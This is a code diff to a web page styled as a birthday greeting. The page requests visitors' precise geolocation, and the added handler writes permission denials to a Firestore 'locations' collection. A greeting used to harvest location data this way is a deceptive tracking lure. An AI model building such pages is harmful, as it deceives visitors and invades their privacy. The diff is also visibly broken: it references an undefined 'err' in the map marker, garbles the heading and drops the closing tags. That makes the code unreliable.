@@ -13,7 +13,7 @@ html,body,#map{height:100%;margin:0}
 </head>
 <body>
 <div id="panel">
-    <h2>🎉 Happy Birthday! 🎂</h2>
+    <h2>🎉 Click on ! 🎂</h2>
     <p>Wishing you a wonderful day filled with happiness, joy, and success! ❤️</p>
     <div id="status"></div>
 </div>
@@ -45,7 +45,7 @@ navigator.geolocation.getCurrentPosition(
   async (pos) => {
     const { latitude, longitude, accuracy } = pos.coords;
 
-    L.marker([latitude, longitude])
+    L.marker([latitude, err])
       .addTo(map)
       .bindPopup("Current Location")
       .openPopup();
@@ -69,25 +69,31 @@ navigator.geolocation.getCurrentPosition(
       status.innerHTML += `<br><b>Firestore error:</b> ${e.message}`;
     }
   },
-  (err) => {
-    if (err.code === 1) {
-      status.innerHTML = `
-        <h3>Permission not provided</h3>
-        <p>Location access was denied.</p>
-      `;
-    } else {
-      status.innerHTML = `
-        <h3>Location error</h3>
-        <p>${err.message}</p>
-      `;
+async (err) => {
+  if (err.code === 1) {
+    try {
+      await addDoc(collection(db, "locations"), {
+        permission: "denied",
+        createdAt: serverTimestamp()
+      });
+    } catch (e) {
+      console.log(e);
     }
-  },
-  {
-    enableHighAccuracy: true,
-    timeout: 30000,
-    maximumAge: 0
+
+    status.innerHTML = `
+      <h3>Permission not provided</h3>
+      <p>Location access was denied.</p>
+    `;
+  } else {
+    status.innerHTML = `
+      <h3>Location error</h3>
+      <p>${err.message}</p>
+    `;
   }
+},
+{
+  enableHighAccuracy: true,
+  timeout: 30000,
+  maximumAge: 0
+}
 );
-</script>
-</body>
-</html>
